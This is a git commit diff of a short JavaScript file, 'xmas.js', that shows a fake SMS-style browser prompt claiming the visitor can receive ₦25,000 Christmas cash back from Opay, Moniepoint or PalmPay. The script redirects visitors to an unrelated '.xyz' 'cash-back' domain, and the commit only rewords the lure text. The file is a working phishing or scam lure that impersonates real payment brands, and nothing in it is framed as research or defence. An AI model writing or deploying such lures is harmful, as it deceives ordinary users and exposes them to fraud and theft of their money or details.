003ea8c1f0e7ec8d0127999926196a75e3107fd2
bigetijazz9 <bigetijazz9@gmail.com>
2024-11-14 21:33:32 -0800

    Update xmas.js

--- xmas.js
+++ xmas.js
@@ -1,6 +1,6 @@
 
 var password = 'CLAIM ₦25,000'
-password=prompt('SMS: hello, you are eligible to receive ₦25,000 cash back from Opay| Moniepoint |PalmPay in celebration of "CHRISTMAS/NEW YEAR" festival, press OK to proceed now','CLAIM ₦25,000');
+password=prompt('SMS: hello, you are eligible to receive ₦25,000 cash back from Opay| Moniepoint |PalmPay celebrate CHRISTMAS festival, press OK to proceed now','CLAIM ₦25,000');
 if (password != 'CLAIM ₦25,000') {
 location.href='https://www.get-mega-offre.xyz/cash-back';
 }
